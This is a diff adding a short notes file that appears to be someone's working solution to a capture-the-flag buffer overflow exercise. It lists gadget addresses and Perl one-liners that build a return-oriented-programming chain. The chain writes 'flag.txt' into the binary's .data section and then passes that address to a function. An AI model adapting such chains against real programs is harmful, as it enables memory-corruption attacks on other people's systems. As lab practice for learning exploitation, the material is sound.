@@ -1,0 +1,15 @@
+Useful addresses (maybe) (not ordered)
+400615 (popq %rbp)
+601028 (.data)
+400606 (movl %edx, 0x48(%rbp))	(so in this case we might be able to store 600fe0 in rbp, which in this instruction offsets it by 0x48 (to 601028) to write directly to .data and then increment the address in our buffer)
+40062a (popq %rdx)
+
+possible string
+perl -e 'print "A"x40 . "\x15\x06\x40" . "\x00"x5 . "\xe0\x0f\x60" . "\x00"x5 . "\x2a\x06\x40" . "\x00"x5 . "\x66\x6c\x61\x67" . "\x00"x4 . "\x00"x8 . "\x06\x06\x40" . "\x00"x5'
+"\n" . "A"x40 . "\x15\x06\x40" . "\x00"x5 . "\xe0\x0f\x60" . "\x00"x5 . "\x2a\x06\x40" . "\x00"x5 . "\x2e\x7f\x78\x74" . "\x00"x4 . "\x00"x8 . "\x06\x06\x40" . "\x00"x5'
+
+
+
+final string:
+
+perl -e 'print "A"x40 . "\x15\x06\x40" . "\x00"x5 . "\xe0\x0f\x60" . "\x00"x5 . "\x2a\x06\x40" . "\x00"x5 . "flag" . "\x00"x4 . "\x00"x8 . "\x06\x06\x40" . "\x00"x5 . "A"x424 . "A"x40 . "\x15\x06\x40" . "\x00"x5 . "\xe4\x0f\x60" . "\x00"x5 . "\x2a\x06\x40" . "\x00"x5 . ".txt" . "\x00"x4 . "\x00"x8 . "\x06\x06\x40" . "\x00"x5 . "A"x424 . "A"x40 . "\xa3\x06\x40" . "\x00"x5 . "\x28\x10\x60" . "\x00"x5 . "\x10\x05\x40" . "\x00"x5'
